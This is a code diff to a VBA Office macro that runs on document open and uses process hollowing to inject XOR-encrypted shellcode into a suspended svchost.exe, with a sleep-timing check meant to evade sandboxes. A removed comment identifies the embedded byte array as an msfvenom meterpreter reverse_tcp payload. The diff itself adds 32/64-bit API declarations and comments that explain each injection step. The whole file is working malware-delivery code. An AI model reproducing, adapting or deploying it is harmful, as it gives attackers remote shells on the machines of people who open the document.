@@ -1,10 +1,21 @@
-Private Declare PtrSafe Function NtQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
-Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
-Private Declare PtrSafe Function NtReadVirtualMemory Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
-Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
-Private Declare PtrSafe Function NtResumeThread Lib "NTDLL" (ByVal hThread As LongPtr) As Long
-Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
-Private Declare PtrSafe Sub RtlZeroMemory Lib "kernel32" (Destination As STARTUPINFOA, ByVal Length As Long)
+#If Win64 Then
+    Private Declare PtrSafe Function NtQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
+    Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
+    Private Declare PtrSafe Function NtReadVirtualMemory Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
+    Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
+    Private Declare PtrSafe Function ResumeThread Lib "kernel32" (ByVal hThread As LongPtr) As Long
+    Private Declare PtrSafe Sub RtlZeroMemory Lib "kernel32" (Destination As STARTUPINFOA, ByVal Length As Long)
+    Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
+    
+#Else
+    Private Declare Function ZwQueryInformationProcess Lib "NTDLL" (ByVal hProcess As LongPtr, ByVal procInformationClass As Long, ByRef procInformation As PROCESS_BASIC_INFORMATION, ByVal ProcInfoLen As Long, ByRef retlen As Long) As Long
+    Private Declare Function CreateProcessA Lib "KERNEL32" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As LongPtr, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFOA, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
+    Private Declare Function ReadProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal dwSize As Long, ByVal lpNumberOfBytesRead As Long) As Long
+    Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, lpBuffer As Any, ByVal nSize As Long, ByVal lpNumberOfBytesWritten As Long) As Long
+    Private Declare Function ResumeThread Lib "KERNEL32" (ByVal hThread As LongPtr) As Long
+    Private Declare Sub RtlZeroMemory Lib "KERNEL32" (Destination As STARTUPINFOA, ByVal Length As Long)
+
+#End If
 
 Private Type PROCESS_BASIC_INFORMATION
     Reserved1 As LongPtr
@@ -51,11 +62,12 @@ Sub AutoOpen()
     hollow
 End Sub
 
+' Performs process hollowing to run shellcode in svchost.exe
 Function hollow()
 
-' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
+  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
   dream = Int((1500 * Rnd) + 2000)
-  before = Now()
+  Before = Now()
   Sleep (dream)
   If DateDiff("s", t, Now()) < dream Then
     Exit Function
@@ -66,6 +78,7 @@ Function hollow()
     si.dwFlags = &H100
     Dim pi As PROCESS_INFORMATION
     Dim procOutput As LongPtr
+    ' Start svchost.exe in a suspended state
     procOutput = CreateProcessA(vbNullString, "C:\\Windows\\System32\\svchost.exe", ByVal 0&, ByVal 0&, False, &H4, 0, vbNullString, si, pi)
     
     Dim ProcBasicInfo As PROCESS_BASIC_INFORMATION
@@ -86,7 +99,6 @@ Function hollow()
     Dim tmp As Long
     tmp = 0
 #If Win64 Then
-    ' Read 8 bytes of PEB to obtain base address of svchost in AddrBuf
     readOutput = NtReadVirtualMemory(ProcInfo, PEBinfo, AddrBuf(0), 8, tmp)
     svcHostBase = AddrBuf(7) * (2 ^ 56)
     svcHostBase = svcHostBase + AddrBuf(6) * (2 ^ 48)
@@ -97,7 +109,6 @@ Function hollow()
     svcHostBase = svcHostBase + AddrBuf(1) * (2 ^ 8)
     svcHostBase = svcHostBase + AddrBuf(0)
 #Else
-    ' Read 4 bytes of PEB to obtain base address of svchost in AddrBuf
     readOutput = NtReadVirtualMemory(ProcInfo, PEBinfo, AddrBuf(0), 4, tmp)
     svcHostBase = AddrBuf(3) * (2 ^ 24)
     svcHostBase = svcHostBase + AddrBuf(2) * (2 ^ 16)
@@ -107,7 +118,7 @@ Function hollow()
 
     Dim data(512) As Byte
     readOutput2 = NtReadVirtualMemory(ProcInfo, svcHostBase, data(0), 512, tmp)
-    
+
     Dim e_lfanew_offset As Long
     e_lfanew_offset = data(60)
 
@@ -128,7 +139,6 @@ Function hollow()
     ' TODO change the key
     key = "0xfa"
 
-' msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key 0xfa
 sc = Array(204, 48, 229, 133, 192, 144, 170, 97, 48, 120, 39, 48, 113, 40, 52, 48, 120, 73, 180, 55, 85, 48, 237, 51, 80, 48, 237, 51, 40, 48, 237, 51, 16, 48, 105, 214, 122, 50, 43, 80, 249, 48, 237, 19, 96, 48, 87, 161, 156, 68, 7, 29, 50, 84, 70, 32, 241, 177, 107, 32, 49, 185, 132, 140, 98, 57, 55, 41, 187, 42, 70, 234, 114, 68, 46, 96, 224, 30, 231, 25, 40, _
 115, 100, 110, 181, 10, 102, 97, 48, 243, 230, 233, 48, 120, 102, 41, 181, 184, 18, 6, 120, 121, 182, 37, 187, 56, 70, 234, 120, 96, 47, 96, 224, 40, 133, 55, 125, 73, 175, 41, 207, 177, 39, 234, 4, 240, 46, 96, 230, 48, 87, 161, 113, 185, 175, 108, 156, 57, 103, 160, 8, 152, 19, 144, 124, 123, 42, 69, 56, 61, 95, 176, 69, 160, 62, 37, 187, 56, 66, 40, 49, _
 168, 0, 32, 187, 116, 46, 37, 187, 56, 122, 40, 49, 168, 39, 234, 52, 240, 39, 57, 113, 32, 56, 41, 49, 168, 63, 59, 113, 32, 39, 56, 113, 34, 46, 226, 220, 88, 39, 51, 207, 152, 62, 32, 105, 34, 46, 234, 34, 145, 45, 158, 207, 135, 59, 40, 142, 15, 21, 83, 111, 75, 84, 97, 48, 57, 48, 40, 185, 158, 46, 224, 220, 216, 103, 97, 48, 49, 239, 132, 121, _
@@ -139,6 +149,7 @@ sc = Array(204, 48, 229, 133, 192, 144, 170, 97, 48, 120, 39, 48, 113, 40, 52, 4
 
     Dim scSize As Long
     scSize = UBound(sc)
+    ' Decrypt shellcode
     Dim keyArrayTemp() As Byte
     keyArrayTemp = key
     
@@ -148,12 +159,15 @@ sc = Array(204, 48, 229, 133, 192, 144, 170, 97, 48, 120, 39, 48, 113, 40, 52, 4
         i = (i + 2) Mod (Len(key) * 2)
     Next x
     
+    ' TODO set the SIZE here (use a size > to the shellcode size)
     Dim buf(685) As Byte
     For y = 0 To UBound(sc)
         buf(y) = sc(y)
     Next y
     
+    ' Write the shellcode into the svchost.exe entry point
     a = WriteProcessMemory(ProcInfo, addressOfEntryPoint, buf(0), scSize, tmp)
-    b = NtResumeThread(pi.hThread)
+    ' Resume svchost.exe process to run the shellcode
+    b = ResumeThread(pi.hThread)
  
 End Function
